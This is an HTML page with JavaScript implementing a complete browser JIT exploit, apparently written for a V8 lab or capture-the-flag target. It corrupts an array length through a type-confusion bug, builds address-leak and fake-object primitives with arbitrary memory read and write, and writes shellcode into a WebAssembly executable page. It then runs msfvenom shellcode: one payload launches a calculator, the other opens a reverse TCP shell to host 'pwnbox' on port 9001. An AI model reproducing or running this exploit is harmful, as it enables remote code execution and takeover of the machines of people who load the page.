<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Ready?</title>
</head>
<body>
  <button onclick="pwn('calc');">Click to pwn (calc) ðŸ˜ˆ</button><br><br>
  <button onclick="pwn('shell');">Click to pwn (shell)ðŸ˜ˆ</button>
</body>
<script>
  function log(msg) {
    console.log(msg);
  }
  const shellcode = {
    // msfvenom -p linux/x64/exec CMD='DISPLAY=:1 gnome-calculator' --format dword
    'calc': [
      0x622fb848, 0x732f6e69, 0x50990068, 0x66525f54, 0x54632d68, 0x1fe8525e, 0x44000000, 0x4c505349,
      0x3a3d5941, 0x302e3031, 0x6f6e6720, 0x632d656d, 0x75636c61, 0x6f74616c, 0x57560072, 0x3b6a5e54,
      0x00050f58
    ],
    // msfvenom -p linux/x64/shell_reverse_tcp LHOST=pwnbox LPORT=9001 --format dword
    'shell': [
      0x9958296a, 0x6a5f026a, 0x050f5e01, 0xb9489748, 0x29230002, 0x82e9f4cf, 0xe6894851, 0x6a5a106a,
      0x050f582a, 0x485e036a, 0x216aceff, 0x75050f58, 0x583b6af6, 0x2fbb4899, 0x2f6e6962, 0x53006873,
      0x52e78948, 0xe6894857, 0x0000050f
    ]
  }
  function pwn(mode) {
    // Helper functions to convert between float and integer primitives
    var buf = new ArrayBuffer(8); // 8 byte array buffer
    var f64_buf = new Float64Array(buf);
    var u32_buf = new Uint32Array(buf);

    /**
      * Float to Integer
      * in: Float (ex: 2.2)
      * out: Unsigned Int
    */
    function ftoi(val) { // typeof(val) = float
      f64_buf[0] = val;
      return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n); // Watch for little endianness
    }

    /**
      * Integer to Float
      * in: Unsigned Int
      * out: Float (ex: 2.2)
    */
    function itof(val) { // typeof(val) = BigInt
      u32_buf[0] = Number(val & 0xffffffffn);
      u32_buf[1] = Number(val >> 32n);
      return f64_buf[0];
    }

    glob = {};
    function bug_jit(flag) {
      let bad = arr[0] ^ 0;
      bad += 1;
      // predict: 0 | effective: 1 
      let i = Math.max(Math.max(0, bad) - 0x7fffffff, 0) >> 1;
      glob[i] = 1;
      if (flag)
        i = -1;

      let v4 = Math.sign(i);
      v4 = Math.sign(i) < 0 ? 0 : v4;
      let v5 = new Array(v4);
      v5.shift();
      return v5;
    }

    function addrOf(object) {
      obj_arr[0x2f] = object;
      return (ftoi(float_arr2[0]) & 0xffffffffn);
    };

    function fakeObj(addr) {
      float_arr[0xa] = itof(addr);
      return obj_arr[1];
    }

    function read(addr) {
      // pointer tagging
      if (addr % 2n == 0) {
        addr += 1;
      }

      fake_arr[1] = itof((8n << 32n) + addr - 8n);
      return fake[0];
    }

    function write(addr, val) {
      // pointer tagging
      if (addr % 2n == 0) {
        addr += 1;
      }
      fake_arr[1] = itof((8n << 32n) + addr - 8n);
      fake[0] = itof(BigInt(val));
    }

    function copy_shellcode(addr, shellcode) {
      let buf = new ArrayBuffer(0x100);
      let dataview = new DataView(buf);
      let buf_addr = addrOf(buf);
      let backing_store_addr = buf_addr + 0x14n;
      write(backing_store_addr, addr);

      for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4 * i, shellcode[i], true);
      }
    }

    var arr = new Uint32Array([0x80000000]);
    for (let i = 0; i < 200000; ++i) {
      bug_jit(true);
    }
    oob = bug_jit(false);
    if (oob.length !== -1) {
      log("[-] error to corrupt oob length");
      throw null;
    }

    let float_arr = [2.2, 3.3, 4.4];
    let obj_arr = [{}, {}, {}];
    let float_arr2 = [2.2, 3.3, 4.4];

    oob[12 + 26] = 0x100; // float_arr.length = 0x100
    oob[31 + 26] = 0x100; // float_arr.length = 0x100

    if (obj_arr.length !== 0x100 || float_arr.length !== 0x100) {
      log("[-] failed to overwrite lengths");
      throw null;
    }
    log("[+] float_arr.length === 0x100");
    log("[+] obj_arr.length === 0x100");

    var float_map = ftoi(float_arr[29]) & 0xffffffffn;
    var obj_map = ftoi(float_arr[5]) & 0xffffffffn;

    log("[+] Float  Map: 0x" + float_map.toString(16));
    log("[+] Object Map: 0x" + obj_map.toString(16));

    var fake_arr = [itof(float_map), 1.2, 1.3, 1.4];
    var fake = fakeObj(addrOf(fake_arr) + 0x20n); // Object(float_map)

    var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var wasm_exec_shellcode = wasm_instance.exports.main;

    log("[+] Found pointer to wasm instance: 0x" + addrOf(wasm_instance).toString(16));
    var rwx_page_addr = ftoi(read(addrOf(wasm_instance) + 0x68n));
    log("[+] Found pointer to rwx page: 0x" + addrOf(rwx_page_addr).toString(16));

    copy_shellcode(rwx_page_addr, shellcode[mode]);

    log("[+] WASM instance - OK");
    log("[+] Shellcode - OK");
    log("[+] Read/write/exec - OK");

    log("[*] Running shellcode...");
    wasm_exec_shellcode();
  }
</script>
</html>